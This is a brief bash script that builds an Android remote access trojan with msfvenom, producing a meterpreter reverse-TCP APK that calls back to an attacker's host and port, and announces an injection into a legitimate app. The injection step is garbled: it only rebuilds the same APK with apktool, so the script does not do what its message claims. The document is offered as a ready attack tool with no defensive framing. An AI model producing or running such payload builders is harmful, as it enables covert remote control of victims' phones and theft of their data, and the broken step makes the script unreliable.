#!/bin/bash

echo "[*] Building Android RAT payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R > rat.apk

echo "[*] Injecting payload into a legitimate app..."
apktool b rat.apk